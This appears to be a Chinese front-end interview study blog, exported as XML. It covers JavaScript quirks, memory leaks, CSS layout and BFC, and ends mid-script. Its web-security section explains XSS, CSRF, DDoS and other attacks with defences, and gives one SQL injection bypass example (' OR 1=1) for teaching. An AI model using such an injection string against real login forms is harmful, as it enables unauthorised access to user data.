-(Math.pow(2, 53) - 1) === -(2**53 - 1) === -9007199254740991// 答案：111111111111111110000 运算优先级 1234567var val = 'c'var str = 'Value is' + (val === 'c') ? 'a':'b'console.log(str)// 运算优先级，从高到低: () =&gt; + =&gt; ? :// 因此，即'Value is' + true ? a : b =&gt; 'Value istrue' ? a : b =&gt; a// 答案: a RegExp.test() 参数为字符串 12345var lowerCase = /^[a-z]+$/;[lowerCase.test(null), lowerCase.test()]// test() 参数是一个字符串，如果不是，会强制转化为字符串。test(null)转化为test('null')， test()转化为test('undefined').// 答案: [true, true] 用大于数组本身长度补全数组，用empty，而不是undefined 12345678var arr = [0,1,2]arr[10] = 10arr.filter(function(x) &#123; return x === undefined&#125;)// 用大于数组本身长度补全数组，用empty，而不是undefined, 因此arr为[0, 1, 2, empty × 7, 10]，没有undefined，filter结果为[]。// 答案: [] Math.min()、Math.max() 不传参 12345678var min = Math.min();var max = Math.max();min &lt; max// Math.min() 和 Math.max() 两个方法，若传递多个参数会返回最小/大值// 若不传递参数，Math.min() === Infinity, Math.max() === -Infinity// 非数值比较，先后调用valueOf()、toString()，转化为纯字符串，根据ASCII码，'-'为45，'I'为75,故'Infinity' &gt; '-Infinity'.// 答案: false 双等号会转换数据类型, 全等号不会转化数据类型 123456789101112131415var a = &#123; value:2, toString:function()&#123; return ++this.value &#125;&#125;if(a == 3 &amp;&amp; a == 4)&#123; console.log('amazing')&#125;else&#123; console.log('nothing')&#125;// a == 3,左边对象，右边为数值，对象调用自身的toString()方法，转化为数值，结果为true; 同理a==4，有执行一次，结果也为true。答案为'amazing'.// 若改为全等a===3 &amp;&amp; a===4，不会对a进行格式转化，虽然两边数值成立，但数据类型不一样]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 基础概念]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[JS有哪些数据类型 分类原始数据类型：Boolean、Number、String、Null、Undefined、Symbol、BigInt , 共七种引用数据类型：Object 区别：内存：基本数据类型，保存在栈内存。 引用数据类型，实际上是一个指针，这个指针也保存在栈中，但是这个指针指向的对象则保存在堆内存中 访问方式：基本数据类型，按值访问，读写的是它们实际保存的值。 引用数据类型，按引用访问，读写它们时需要先从栈中读取堆内存地址，然后找到保存在堆内存中的值。 复制：基本数据类型，从一个变量向另一个变量复制时，会在栈中创建一个新值，然后把值复制到为新变量分配的空间中。 引用数据类型，复制的是存储在栈中的指针，将指针复制到栈中为新变量分配的空间中，而这个指针副本和原指针指向的是同一个堆内存中的对象；复制操作后两个变量实际上将引用同一个对象，因此改变其中一个将影响到另外一个 什么是闭包，为什么要用它简单来说，闭包就是能够读取其他函数内部变量的函数由于 JavaScript 特殊的作用域，函数外部无法直接读取内部的变量，内部可以直接读取外部的变量，从而就产生了闭包的概念最大用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露 内存泄露当创建对象和字符串等时，JavaScript就会分配内存，并在不再使用时自动释放内存，这种机制被称为垃圾收集GC。回收机制有标记清除和引用计数。 内存泄露是指一块被分配的内存既不能使用，又不能回收，直到浏览器进程结束。一般是堆区内存泄漏，栈区不会泄漏。 四种常见的JavaScript内存泄漏1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// 1.意外的全局变量。当引用未声明的变量时，会在全局对象中创建一个新变量。在浏览器中，全局对象将是windowfunction leak()&#123; 'use strict'; // 解决方法一，开始处添加'use strict'启用严格模式 a = 233; // 报错 this.b = 'bbb'; // 默认绑定this指向全局, 严格模式下this指向undefined&#125;// 解决方法二，也可以手动释放全局变量的内存window.a = undefineddelete window.b // 2.被遗忘的定时器或回调。当不需要setInterval或者setTimeout时，定时器没有被clear，定时器的回调函数以及内部依赖的变量都不能被回收，造成内存泄漏。var someResource = getData()var timer = setInterval(function() &#123; var node = document.getElementById('Node') if(node) &#123; node.innerHTML = JSON.stringify(someResource)) &#125; // node、someResource 存储了大量数据 无法回收&#125;, 1000)clearInterval(timer) // 在定时器完成工作的时候，手动清除定时器。// 3. 闭包。闭包可以维持函数内局部变量，使其得不到释放。// 将事件处理函数定义在外部，解除闭包,或者在定义事件处理函数的外部函数中，删除对dom的引用function bindEvent() &#123; var ele = document.createElement('app') ele.onclick=function()&#123; // ... // 这个函数中 可以访问外部的变量ele 所以它引用了ele,而ele又引用了它，因此这个事件绑定将会造成内存泄露 &#125; ele = null // 解决方法一&#125;// 解决方法二，把onclick的函数写在bindEvent外function bindEvent() &#123; var ele = document.createElement("app"); ele.onclick = onclickHandler&#125; function onclickHandler()&#123; // ...&#125;// 4.循环引用。函数将间接引用所有它能访问的对象。一个DOM对象被一个JS对象引用，同时又引用同一个或其它的JS对象。// 要想破坏循环引用，引用DOM元素的对象或DOM对象的引用需要被赋值为null。// 5.没有清理DOM元素引用// 有时，保存 DOM 节点内部数据结构很有用。假如你想快速更新表格的几行内容，把每一行 DOM 存成字典（JSON 键值对）或者数组很有意义。此时，同样的 DOM 元素存在两个引用：一个在 DOM 树中，另一个在字典中。将来你决定删除这些行时，需要把两个引用都清除。var elements = &#123; button: document.getElementById('button'), image: document.getElementById('image'), text: document.getElementById('text')&#125;;function doStuff() &#123; image.src = 'http://some.url/image'; button.click(); console.log(text.innerHTML); // ...&#125;function removeButton() &#123; document.body.removeChild(document.getElementById('button')); // 此时，仍旧存在一个全局的 #button 的引用elements 字典。button 元素仍旧在内存中，不能被 GC 回收。&#125;// 6. 子元素存在引用引起的内存泄漏// 此外还要考虑 DOM 树内部或子节点的引用问题。假如你的 JavaScript 代码中保存了表格某一个 &lt;td&gt; 的引用。将来决定删除整个表格的时候，直觉认为 GC 会回收除了已保存的 &lt;td&gt; 以外的其它节点。实际情况并非如此：此 &lt;td&gt; 是表格的子节点，子元素与父元素是引用关系。由于代码保留了 &lt;td&gt; 的引用，导致整个表格仍待在内存中。保存 DOM 元素引用的时候，要小心谨慎。// 7.console 控制台日志。过多的console，比如定时器的console会导致浏览器卡死。// 解决：合理利用console，线上项目尽量少的使用consoleconsole.log('233'); 介绍一下 JavaScript 原型，原型链每一个构造函数都拥有一个prototype属性，这个属性指向一个对象，也就是原型对象prototype；原型对象默认拥有一个constructor属性，指向它的那个构造函数；每个对象(实例)都拥有一个隐藏的属性prototype，指向它的原型对象。Person.prototype构造函数的原型属性与p.proto 实例对象的原型对象是一个东西，只是从不同的角度访问原型。 JavaScript中所有的对象都是由它的原型对象继承而来。而原型对象自身也是一个对象，它也有自己的原型对象，这样层层上溯，就形成了一个类似链表的结构，这就是原型链所有原型链的终点都是Object函数的prototype属性。Objec.prototype指向的原型对象同样拥有原型，不过它的原型是null，而null则没有原型。 use strict严格模式 和 sloppy mode 稀松模式严格模式将问题直接转化为错误（如语法错误或运行时错误）, 简化了如何为给定名称的特定变量计算，简化了 eval 以及 arguments, 将写”安全“JavaScript的步骤变得更简单，以及改变了预测未来ECMAScript行为的方式。主要涉及一下几点： 严格模式中意外创建全局变量被抛出错误替代严格模式会使引起静默失败的赋值操作(给不可写属性赋值、给只读属性赋值、给不可扩展对象的新属性赋值)抛出异常.严格模式下, 试图删除不可删除的属性时会抛出异常(之前这种操作不会产生任何效果)严格模式要求一个对象内的所有属性名在对象内必须唯一，重名属性被认为是语法错误严格模式要求函数的参数名唯一，重名参数被认为是语法错误严格模式禁止八进制数字语法(零(0)开头的八进制语法,如0644)在ES6中支持为一个数字加”0o”的前缀来表示八进制数.严格模式禁止设置primitive值的属性，如(false.true = “”)将抛出TypeError错误严格模式禁用 with.严格模式下的 eval 不再为上层范围(包围eval代码块的范围)引入新变量，仅为被运行的代码创建变量, 不会使得名称映射到外部变量或者其他局部变量严格模式禁止删除声明变量严格模式让eval和arguments变的简单。名称 eval 和 arguments 不能通过程序语法被绑定或赋值；参数的值不会随 arguments 对象的值的改变而变化；不再支持 arguments.callee在严格模式下通过this传递给一个函数的值不会被强制转换为一个对象为未来的ECMAScript版本铺平道路。新增保留的关键字 implements, interface, let, package, private, protected, public, static和yield 优点：(1)使调试更加容易。那些被忽略或默默失败了的代码错误，会产生错误或抛出异常，因此尽早提醒你代码中的问题，你才能更快地指引到它们的源代码。(2)防止意外的全局变量。如果没有严格模式，将值分配给一个未声明的变量会自动创建该名称的全局变量。这是JavaScript中最常见的错误之一。在严格模式下，这样做的话会抛出错误。(3)消除 this 强制。如果没有严格模式，引用null或未定义的值到 this 值会自动强制到全局变量。在严格模式下，引用 null或未定义的 this 值会抛出错误。(4)不允许重复的属性名称或参数值。当检测到对象中重复命名的属性或检测到函数中重复命名的参数时,严格模式会抛出错误，因此捕捉几乎可以肯定是代码中的bug可以避免浪费大量的跟踪时间。(5)使 eval() 更安全。在严格模式和非严格模式下， eval() 的行为方式有所不同。最显而易见的是，在严格模式下，变量和声明在 eval() 语句内部的函数不会在包含范围内创建（它们会在非严格模式下的包含范围中被创建，这也是一个常见的问题源）。(6)在 delete 使用无效时抛出错误。 delete 操作符（用于从对象中删除属性）不能用在对象不可配置的属性上。当试图删除一个不可配置的属性时，非严格代码将默默地失败，而严格模式将在这样的情况下抛出异常。 活动对象与变量对象什么区别变量对象Variable object: JS执行上下文中都有个对象，函数内部标示符、形参、变量声明等都保存在一个叫做变量对象中，但它是引擎实现上的，不可在JS环境中访问到。活动对象Activation Objec: 就是作用域链上正在被执行和引用的变量对象 命名式函数表达式声明提升: 包括变量和函数在内的所有声明都会在任何代码被执行前首先被处理。函数声明的提升优先于变量声明的提升；重复的var声明会被忽略掉，但是重复的function声明会覆盖掉前面的声明。 函数表达式, 因只有解析器读取到函数表达式所在行的时候才会执行，函数只有在var语句声明之后才能被调用函数声明, 因函数声明提升，函数可以在function声明之前被调用123456789101112131415161718var foo = function bar()&#123; return 12 &#125;typeof bar() // bar is not defined// 可改为var bar = function()&#123; return 12; &#125;typeof bar() // number// 或者function bar()&#123; return 12; &#125;typeof bar() // number// 明确说明这个下问题var foo = function bar()&#123; // foo is visible here // bar is visible here console.log(typeof bar) // Work here&#125;;// foo is visible here// bar is not defined here 函数实例name属性 1234567function foo() &#123; &#125;var oldName = foo.namefoo.name = "bar"[oldName, foo.name]// 函数实例会有一个内置的name属性，这个属性是只读的，writable为false, 所以不管怎么赋值都是无效的。// ["foo","foo"] TDD (Test Driven Development) 测试驱动开发，即在写任何功能代码之前，先写它的测试代码根据需要编写一个测试用例编写功能代码，以让刚才的测试用例通过逐步补充测试用例修改功能代码使新增的测试用例和原来的都通过重构，包括功能代码和测试用例 BDD(Behaviour Driven Development) 行为驱动开发，TDD 的分支，但 BDD 强调的是写测试的风格，更容易理解，更加语义化。即测试要写得像自然语言，运用一些比如expect、should等跟自然语言相近的断言，让项目的各个成员甚至产品都能看懂测试，甚至编写测试1234567891011121314var add = require('../src/add.js');var expect = require('chai').expect;describe('加法函数的测试', function() &#123; it('1 加 1 应该等于 2', function() &#123; expect(add(1, 1)).to.be.equal(2); &#125;); it('任何数加0应该等于自身', function() &#123; expect(add(1, 0)).to.be.equal(1); &#125;);&#125;);mocha --recursive px、dp、dpr、ppi、viewport1、dp (device pixel 设备像素）,设备中使用的物理像素,单位pt。一个固定的尺寸，1pt = 1/72(inch),inch 英寸，而1英寸等于2.54厘米 2、px (CSS pixels 逻辑像素)，Web编程的概念，指的是CSS样式代码中使用的逻辑像素。px是一个相对单位，相对的是设备像素 3、dpr(Device Pixel Ratio) 设备像素比, 表示1个CSS像素（宽度）等于几个物理像素（宽度） dpr = 物理像素数 / 逻辑像素数 4、ppi (pixel per inch）每英寸的像素数，像素密度 5、viewport 视窗。在桌面浏览器中，viewport就是浏览器窗口的宽度高度。但移动设备的屏幕比桌面屏幕要小得多，为了要让网页在小尺寸的屏幕上显示正确，就需要对viewport做些处理。需要把viewport分成两部分：visual viewport和layout viewport。把layout viewport想像成为一张大图。现在用一个比较小的框，通过它来看这张大图。在框内看到的部分就是visual viewport。框中的度量单位是CSS像素。可以把这个框靠近一些（放大看局部）或靠远一些（缩小看整体）。也可以改变框的方向，但是大图layout viewport的大小和形状永远不会变。 6、idea viewport 理想窗口尺寸, 用户刚进入页面时不再需要缩放 width=device-width或者initial-scale=1.0 7、viewport meta标签，为了不让浏览器自动缩小，引入了viewport元标签。通过这个元标签控制layout viewport的宽度。12&lt;!-- 这行代码就是告诉浏览器，layout viewport 布局视口的 width 宽度应该与 idea viewport 理想视口的宽度一致 --&gt;&lt;meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"&gt; 说明:iPhone 6使用的是Retina视网膜屏幕，使用2px x 2px的 device pixel 代表 1px x 1px 的 css pixel，所以设备像素数为750 x 1334px，而CSS逻辑像素数为375 x 667px。 比如dpr=2时，1个CSS像素宽度等于2个物理像素宽度。1css像素由2 * 2个物理像素点组成。DPR不是单位，而是一个属性名，比如在浏览器中通过window.devicePixelRatio获取屏幕的DPR 通过 document.documentElement.clientWidth 获取 layout viewport 的宽度；通过 window.innerWidth 获取 visual viewport 的宽度。 移动端 1px 像素问题实现边框的方法都是设置 border: 1px solid #ccc ，但是在 retina 屏上因为设备像素比(dpr)的不同，边框在移动设备上的表现也不相同： 1px 可能会被渲染成 2px, 3px… 也就是说逻辑像素1px会被用不同大小的物理像素来表示。 几种常用的方式1、rem + viewport， 根据dpr不同来进行缩放。设置网页根字体 font-size 为 37.5 * dpr，这样根据 rem 产出的网页就会被放大 dpr 倍，此时css里面写的还是1px，然后再通过 initial-scale= 1 / dpr 来对网页进行缩小dpr倍。这样 1px 就会显示成 1 / dpr px。 2、border-image 实现。 缺点是，需要制作图片，圆角的时候会出现模糊。12345.border-image-1px &#123; border-width: 1px 0px; -webkit-border-image: url("border.png") 2 0 stretch; border-image: url("border.png") 2 0 stretch;&#125; 3、background-image 渐变实现。纯粹的css就不能实现，缺点是不能实现圆角 4、box-shadow 实现。优点是圆角不是问题，缺点是颜色不好控制123div&#123; -webkit-box-shadow:0 1px 1px -1px rgba(0, 0, 0, 0.5);&#125; 5、伪类 + transform 实现原理是把原先元素的 border 去掉，然后利用 :before 或者 :after 重做 border ，并 transform 的 scale 缩小一半，原先的元素相对定位，新做的 border 绝对定位。优点可以实现圆角，缺点是按钮添加active比较麻烦，对于已经使用伪类的元素(例如clearfix)，可能需要多层嵌套。12345678910111213141516.scale-1px&#123; position: relative; border:none;&#125;.scale-1px:after&#123; content: ''; position: absolute; bottom: 0; background: #000; width: 100%; height: 1px; -webkit-transform: scaleY(0.5); transform: scaleY(0.5); -webkit-transform-origin: 0 0; transform-origin: 0 0;&#125;]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你问我答 HTML和CSS]]></title>
    <url>%2F2019%2F04%2F10%2FReview%2F%E4%BD%A0%E9%97%AE%E6%88%91%E7%AD%94-HTML%E5%92%8CCSS%2F</url>
    <content type="text"><![CDATA[什么是盒子模型在网页中，把HTML中的元素看做是一个矩形的盒子（盛装内容的的容器），每个容器都是由元素内容content、内边距（padding）、边框（border）和外边距（margin）组成。4个部分一起构成了css中元素的盒模型。 两种盒子模型w3c的盒子模型：padding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 (Element width = width + border + padding ) ，此属性表现为标准模式下的盒模型。 box-sizing:content-box; IE的盒子模型：padding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 (Element width = width ) 。 box-sizing:border-box; W3C盒模型与IE盒模型的区别就是对宽高的定义不同。W3C认为，宽高是内容区的宽度（只包含节点显示的具体内容）。IE认为，宽高是显示效果的实际效果（包含节点的全部内容） 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素：a、b、span、img、input、strong、select、label、em、button、textarea块级元素：div、ul、li、dl、dt、dd、p、h1-h6、blockquote空元素：即系没有内容的HTML元素，例如：br、meta、hr、link、input、img href与src的区别src，source的简写，表示“源”，是引用一个资源，用来整体替换自身的内容。在 img、script、iframe 等元素上使用。href，Hypertext Reference的缩写，表示“超链接”，可叠加，目的不是为了引用一个资源，而是为了建立联系，让当前标签能够链接到目标地址上。在 link和a 等元素上使用。 link与@import之间的区别两者都是外部引用CSS的方式，但是存在一定的区别：区别1：link除了引用样式文件，还可以引用图片等资源文件，而import只引用CSS样式文件区别2：link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。区别3：link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。区别4：ink支持使用Javascript控制DOM去改变样式；而@import不支持。 浏览器的内核(Rendering Engine渲染引擎)IE: TridentFirefox：GeckoSafari：Webkit内核Opera：以前是Presto内核，现改用Blink内核Chrome：Blink(基于webkit，Google与Opera Software共同开发) 一次完整的HTTP事务是怎样的一个过程？基本流程：a. 域名解析(浏览器自身的DNS缓存-&gt;操作系统-&gt;hosts文件-&gt;本地首选DNS服务器发起域名解析请求) b. 发起TCP的3次握手(防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。解决网络中存在延迟的重复分组的问题，同时防止服务器端的一直等待而浪费资源) 第一次握手：客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。 c. 建立TCP连接后发起http请求 d. 服务器端响应http请求，浏览器得到html代码 e. 浏览器解析html代码，并请求html代码中的资源 f. 浏览器对页面进行渲染呈现给用户 常见Web攻击技术（1）XSS(Cross-Site Scripting 跨站脚本攻击)。攻击者在网页中嵌入恶意脚本程序，使之在用户的浏览器上运行非法的HTML标签或者JavaScript。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。根据存储区(恶意代码存放的位置)和 插入点(由谁取得恶意代码，并插入到网页上)分成三类。反射性XSS: 非持久型，攻击者构造出特殊的URL，其中包含恶意代码，用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。常见于通过URL传递参数的功能，如在搜索和跳转。 存储型XSS: 持久化型，攻击者将恶意代码提交到目标网站的数据库中，用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在HTML中返回给浏览器，用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。常见于带有用户保存数据的网站功能，如论坛、博客、留言板、网站的留言、评论、日志等交互处。 DOM型XSS: 前端JS代码本身不够严谨，把不可信的数据当作代码执行了。完全在前端浏览器触发，无需服务端的参与，这是前端开发工程师的地盘。特别注意以下输入源进行转移document.URL、location.hash、location.research、document.referrer(此处应尤为注意，referrer属性虽然可用于避免CSRF，但可触发XSS攻击)、XHR返回值（跨域返回值）、form表单及各种input框。在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为HTML插到页面上，应尽量使用 .textContent、.setAttribute() 等。DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，a 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，务必避免。 解决方案：不用DOM中的内联事件监听器；将输入的数据进行转义处理；使用成熟的 Vue/React框架；Set-Cookie: HttpOnly;设置 HTTP Header：X-XSS-Protection: 0 (禁止XSS过滤) / 1; mode=block (当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面) （2）SQL注入攻击。含义：通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，比如SELECT * FROM users WHERE ‘username’ = ‘admin’ and ‘password’ = ‘’ OR 1=1’ ，这句 sql 无论 username 和 password 是什么都会执行，从而将所有用户的信息取出来。解决方案：特殊字符过滤，orm框架可以对参数进行转义；对sql语句进行预编译；关闭错误信息；客户端对数据进行加密；控制数据库的权限，比如只能select，不能insert。 （3）CSRF(Cross-Site Request Forgeries，跨站点请求伪造)。含义：借助本地cookie，伪装成受信任用户的名义发送恶意请求。解决方案：验证 HTTP Referer 判断请求的来源地址、token验证、自定义在HTTP头属性。 （4）DDos攻击(Distributed Denial of Service Attack 分布式拒绝服务攻击)。含义：在短时间内发起大量请求，耗尽服务器的资源，无法响应正常的访问，造成网站实质下线。攻击方式：Ping Flood攻击即利用ping命令不停的发送的数据包到服务器； SYN Flood攻击即利用tcp协议原理，伪造受害者的ip地址，一直保持与服务器的连接，导致受害者连接服务器的时候拒绝服务。解决方案：备份网站，全静态网页，以备临时应对；请求过滤拦截(高防服务器、设置防火墙、黑名单)；带宽扩容；检测技术和清洗技术；CDN 加速。 （5）Cookies攻击。含义：通过document.cookie,立刻就可以看到当前站点的cookie。解决方案：在cookie打上HttpOnly的标记，这样就无法通过JS来取得。 （6）重定向攻击。含义：钓鱼攻击者，通常会发送给受害者一个合法链接，当链接被点击时，用户被导向一个似是而非的非法网站，从而达到骗取用户信任、窃取用户资料的目的。解决方案：白名单,将合法的要重定向的url加到白名单中,非白名单上的域名重定向时拒之；重定向token,在合法的url上加上token,重定向时进行验证。 （7）文件上传攻击。文件名攻击、文件后缀攻击、文件内容攻击。 什么是BFCBFC（Block Formatting Context）块级格式化上下文。具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。 怎样才能形成BFC(1)body 根元素(2)display 为 inline-block、table-cells、flex(3)浮动元素：float 除 none 以外的值(4)绝对定位元素：position 为absolute、fixed (不为relative和static)(5)overflow 除了 visible 以外的值 (hidden、auto、scroll) BFC布局规则(1)内部的Box会在垂直方向上一个接一个的放置(2)垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。(3)每个元素的左外边缘（margin-left)，与包含块的左边相接触(对于从左往右的格式化，否则相反)，即使存在浮动也是如此。除非这个元素自己形成了一个新的BFC。(4)BFC的区域不会与float的元素区域重叠。(5)计算BFC的高度时，浮动子元素也参与计算。(6)BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然。 应用(1)清除浮动。如子元素是float 浮动的，受浮动影响，父元素的高度塌陷。在父元素加上 overflow: hidden 使其形成BFC，则因计算高度时会计算float的子元素的高度，而达到清除浮动影响的效果。(2)两列自适应布局。 12345678910111213141516&lt;div&gt; &lt;div class="left"&gt;left&lt;/div&gt; &lt;div class="right"&gt;blablabla...&lt;/div&gt;&lt;/div&gt;.left &#123; float: left; // 会导致right元素的一部分跑到了左侧元素下方 width: 100px; height: 50px; background-color: yellow;&#125;.right &#123; background-color: pink; // 触发right元素的BFC。因BFC的区域是独立的，不会与页面其他元素相互影响，且不会与float元素重叠，因此就可以形成两列自适应布局 overflow: hidden;&#125; (3)防止垂直margin合并。123456789101112131415161718192021&lt;div class="a"&gt;aaa&lt;/div&gt;&lt;!-- &lt;div class="cap"&gt; --&gt; &lt;div class="b"&gt;bbbbbbbbbbbbbbbbbbbb&lt;/div&gt;&lt;!-- &lt;/div&gt; --&gt;.left&#123; width: 100px; height: 100px; background: red; margin-bottom: 100px;&#125;.right&#123; height: 100px; background: yellow; margin-top: 100px;&#125;&lt;!-- b元素外增加包裹一层父元素，设置 overflow: hidden 使其形成BFC --&gt;.cap&#123; overflow: hidden; // 因为BFC内部是一个独立的容器，所以不会与外部相互影响，可以防止margin合并&#125; 清除浮动的几种方式 12345678910111213141516171819202122232425262728&lt;div class="float-div"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt;&lt;div class="clear-both"&gt;&lt;/div&gt;&lt;div class="normal-div"&gt;A&lt;/div&gt;&lt;!-- 对父级设置高度 --&gt;父级div手动定义height，就解决了父级div无法自动获取到高度的问题。只适合高度固定的布局，要给出精确的高度，如果高度和父级div不一样时，会产生问题。&lt;!-- 父级标签overflow:hidden --&gt;.float-div&#123; overflow:hidden;&#125;&lt;!-- 父级标签定义伪元素::after --&gt;.float-div::after&#123; display: block; content: ''; height: 0px; clear: both;&#125;&lt;!-- 在浮动元素的最后加一个标签，添加空标签，让父级div能自动获取到高度 clear:both --&gt;.clear-both&#123; clear: both;&#125; flex 设为 1、auto、 none 的区别flex 是 flex-grow、flex-shrink、flex-basis 三个属性值的组合缩写。假设以上三个属性同样取默认值，则 flex 的默认值是 0 1 auto。 flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。flex-grow: number; / default 0 / flex-shrink属性定义了项目的收缩比例，默认为1，即如果空间不足，该项目将缩小。如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。flex-shrink: number; / default 1 / flex-basis属性定义了在分配多余空间之前，相对于父弹性盒容器的 项目占据的主轴空间 宽或者高（取决于主轴方向）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间。flex-basis: length | auto; / default auto / 当flex 取默认值，则 flex 的默认值是 0 1 auto。不放大，空间不足则缩小，保持本来大小。 当 flex 取值为 auto，则计算值为 1 1 auto。 当 flex 取值为一个非负数字，则该数字为 flex-grow 值，flex-shrink 取 1，flex-basis 取 0%，即取 num, 1, 1, 0%1234567.item &#123; flex: 1; &#125;/* 等同于 */.item &#123; flex-grow: 1; flex-shrink: 1; flex-basis: 0%;&#125; 当 flex 取值为一个长度或百分比，则视为 flex-basis 值，flex-grow 取 1，flex-shrink 取 1，即取 1, 1, num px / num% 当 flex 取值为两个非负数字，则分别视为 flex-grow 和 flex-shrink 的值，flex-basis 取 0% 当 flex 取值为一个非负数字和一个长度或百分比，则分别视为 flex-grow 和 flex-basis 的值，flex-shrink 取 1 当 flex 取值为 none，则计算值为 0 0 auto 请写出三栏布局，其中左栏、右栏宽度各为200px，中间自适应12345&lt;div class="wrap"&gt; &lt;div class="left"&gt;left&lt;/div&gt; &lt;div class="middle"&gt;middle&lt;/div&gt; &lt;div class="right"&gt;right&lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104* &#123; padding: 0; margin: 0;&#125;.left, .right, .middle&#123; min-height: 200px;&#125;/* float middle要放最后 */.left&#123; float: left; width: 200px; background: red;&#125;.right&#123; float: right; width: 200px; background: yellow;&#125;.middle&#123; background: blueviolet;&#125;/* position */.left&#123; position: absolute; left: 0; width: 200px; background: red;&#125;.right&#123; position: absolute; right: 0; width: 200px; background: yellow;&#125;.middle&#123; position: absolute; left: 200px; right: 200px; background: blueviolet;&#125;/* flex 增加wrap元素，middle放中间 */.wrap&#123; display: flex; /* flex-direction: row; */ /* justify-content: space-between; */&#125;.left&#123; width: 200px; background: red;&#125;.right&#123; width: 200px; background: yellow;&#125;.middle&#123; flex: 1; background: blueviolet;&#125;/* 表格布局 table */.wrap&#123; display: table; width: 100%; heigt: 200px;&#125;.left, .right, .middle&#123; display: table-cell;&#125;.left&#123; width: 200px; background: red;&#125;.right&#123; width: 200px; background: yellow;&#125;.middle&#123; background: blueviolet;&#125;/* 网格布局 grid */.wrap&#123; display: grid; width: 100%; grid-template-rows: 200px; grid-template-columns: 200px auto 200px;&#125;.left&#123; background: red;&#125;.right&#123; background: yellow;&#125;.middle&#123; background: blueviolet;&#125; ie 低版本兼容解决方案 强制使用高版本渲染模式仍然会有部分低版本用户无法正常渲染。治标不治本。 12345强制使用Edge模式来解析网页代码&lt;meta http-equiv="X-UA-Compatible" content="IE=Edge"&gt;强制使用Chrome浏览器内核(如果安装了)&lt;meta http-equiv=”X-UA-Compatible” content=”IE=edge,chrome=1″/&gt; css hack针对不同浏览器编不同的代码能够解决一些问题，不能使用浏览器的新特性。一般适用于不太复杂的页面。 1234567条件注释，很常用。&lt;!--[if IE 6]&gt;coding...&lt;![endif]--&gt; //ie6&lt;!--[if lte IE 9]&gt;coding...&lt;![endif]--&gt; //小于等于ie9属性前缀_background-color:#000; //ie6*background-color:#000; //ie6 ie7 js/css兼容插件在利用下面hack方式下，针对低版本浏览器加载相应插件。能解决大部分的兼容性问题。需要额外加载JS/CSS文件。Html5shiv：使浏览器兼容HTML5标签语法。respond：A fast &amp; lightweight polyfill for min/max-width CSS3 Media Queries (for IE 6-8, and more)bsie：在IE6上支持大部分bootstrap的特性。IE-CSS3/PIE：使ie6-9支持CSS3。 终极方案：低版本提示升级判断浏览器版本，低版本的浏览器提示升级，或强制跳转到升级页面。 为什么要强制提示升级的理由：低版本浏览器份额已经很小，逐渐减小；微软彻底放弃了ie品牌，力推Edge；为了兼容低版本的浏览器浪费大量的时间和精力；html5的新特性无法使用12// 放在页面中或js文件中 都可以。 直接跳转(function(w)&#123;if(!("WebSocket"in 